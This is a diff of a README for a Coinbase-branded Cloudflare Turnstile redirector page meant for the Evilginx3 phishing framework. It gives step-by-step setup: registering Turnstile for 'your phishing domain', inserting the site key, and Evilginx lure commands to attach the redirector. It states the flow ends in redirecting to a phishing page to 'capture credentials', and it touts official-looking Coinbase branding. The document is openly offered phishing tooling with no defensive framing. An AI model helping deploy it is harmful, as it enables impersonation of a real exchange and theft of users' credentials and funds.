@@ -1,42 +1,25 @@
 # Coinbase Turnstile Redirector
 
-## Overview
+Coinbase-branded Cloudflare Turnstile verification page for Evilginx3.
 
-Cryptocurrency exchange security verification page with Coinbase branding and Cloudflare Turnstile CAPTCHA.
+## Setup
 
-## Setup Instructions
+1. **Create Turnstile Site** in Cloudflare dashboard
+   - Domain: Your phishing domain
+   - Widget Mode: Invisible
+   - Copy Site Key
 
-### 1. Create Cloudflare Turnstile Site
+2. **Configure Redirector**
+   - Edit `index.html`
+   - Replace `'YOUR_TURNSTILE_SITE_KEY'` with your Site Key
 
-1. Visit https://dash.cloudflare.com/?to=/:account/turnstile
-2. Add new site with **Invisible** mode
-3. Copy the Site Key
+3. **Use with Lure**
+   ```bash
+   lures create coinbase
+   lures edit <id> redirector coinbase_turnstile
+   lures get-url <id>
+   ```
 
-### 2. Configure the Redirector
+## How It Works
 
-Edit `index.html` line 160:
-```javascript
-const TURNSTILE_SITEKEY = 'YOUR_SITE_KEY';
-```
-
-### 3. Set Up Evilginx3
-
-```
-lures create coinbase
-lures edit 0 redirector coinbase_turnstile
-lures edit 0 path /verify
-lures get-url 0
-```
-
-## Features
-
-- Coinbase blue gradient background (#0052FF)
-- Official-looking logo and branding
-- Crypto security messaging
-- Fully responsive design
-- Auto-redirect after 3 seconds
-
-## Notes
-
-The blue gradient background and modern design match Coinbase's current interface style for 2024/2025.
-
+Lure URL → Coinbase verification → Turnstile check → Redirect to phishing page → Capture credentials
